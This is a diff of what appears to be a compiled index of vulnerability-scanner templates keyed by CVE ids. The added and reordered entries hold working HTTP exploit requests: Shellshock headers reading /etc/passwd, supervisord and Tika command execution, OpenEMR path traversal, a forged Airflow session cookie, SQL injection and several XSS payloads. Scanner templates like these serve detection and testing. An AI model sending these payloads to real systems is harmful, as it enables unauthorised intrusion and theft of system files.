@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5140,6 +5140,21 @@
       ]
     },
     {
+      "id": "CVE-2017-11586",
+      "info": {
+        "name": "FineCms < 5.0.9 - Open redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /index.php?s=member&c=login&m=index HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nback=&data%5Busername%5D={{username}}&data%5Bpassword%5D={{password}}&data%5Bauto%5D=1\n",
+            "GET /index.php?c=weixin&m=sync&url=http://interact.sh HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-11610",
       "info": {
         "name": "XML-RPC Server - Remote Code Execution",
@@ -5149,6 +5164,21 @@
         {
           "raw": [
             "POST /RPC2 HTTP/1.1\nHost: {{Hostname}}\nAccept: text/xml\nContent-type: text/xml\n\n<methodCall>\n  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n  <params>\n    <param>\n      <string>nslookup {{interactsh-url}}</string>\n    </param>\n  </params>\n</methodCall>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-11629",
+      "info": {
+        "name": "FineCms 5.0.10 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?c=api&m=data2&function=%3Cscript%3Ealert(document.domain)%3C/script%3Ep&format=php"
           ]
         }
       ]
@@ -6575,11 +6605,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -8771,6 +8801,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-14530",
+      "info": {
+        "name": "OpenEMR < 5.0.2 - Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_login_session_management=1&authProvider=Default&authUser={{username}}&clearPass={{password}}&languageChoice=1\n",
+            "GET /custom/ajax_download.php?fileName=../../../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -11254,6 +11299,21 @@
       ]
     },
     {
+      "id": "CVE-2020-17526",
+      "info": {
+        "name": "Apache Airflow < 1.10.14 - Authentication Bypass",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /admin/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /admin/ HTTP/1.1\nHost: {{Hostname}}\nCookie: session=.eJwlzUEOwiAQRuG7zLoLpgMM9DIE6D-xqdEEdGW8u03cvy_vQ8UG5o02q_eJhcqx00YdDaKao6p5ZZe89ZyFUaPExqCF-hxWXs8Tj6tXt_rGnKpxC6vviTNiELBxErerBBZk9Zd7T4z_hOn7A0cWI94.YwJ5bw.LzJjDflCTQE2BfJ7kXcsOi49vvY\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-17530",
       "info": {
         "name": "Apache Struts 2.0.0-2.5.25 - Remote Code Execution",
@@ -12672,6 +12732,36 @@
           "path": [
             "{{BaseURL}}/os/mxperson",
             "{{BaseURL}}/meaweb/os/mxperson"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-5191",
+      "info": {
+        "name": "Hospital Management System 4.0 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /hospital/hms/admin/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}&submit=&submit=\n",
+            "POST /hospital/hms/admin/doctor-specilization.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ndoctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3Ctd%3E&submit=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-5192",
+      "info": {
+        "name": "Hospital Management System 4.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /hospital/hms/doctor/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}password={{password}}&submit=&submit=\n",
+            "POST /hospital/hms/doctor/search.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsearchdata='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(md5({{num}}),1),2),NULL--+PqeG&search=\n"
           ]
         }
       ]
@@ -18537,7 +18627,7 @@
     {
       "id": "CVE-2022-0346",
       "info": {
-        "name": "Google XML Sitemap Generator < 2.0.4 - Reflected Cross-Site Scripting & RCE",
+        "name": "Google XML Sitemap Generator < 2.0.4 - Cross-Site Scripting & RCE",
         "severity": "medium"
       },
       "requests": [
@@ -19493,6 +19583,21 @@
           "path": [
             "{{BaseURL}}/phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
             "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2383",
+      "info": {
+        "name": "Feed Them Social < 3.0.1 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=fts_refresh_token_ajax&feed=instagram&expires_in=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E"
           ]
         }
       ]
@@ -20713,6 +20818,21 @@
         {
           "raw": [
             "GET /cgi-bin/ExportLogs.sh HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34576",
+      "info": {
+        "name": "WAVLINK WN535 G3 - Access Control",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/ExportAllSettings.sh"
           ]
         }
       ]
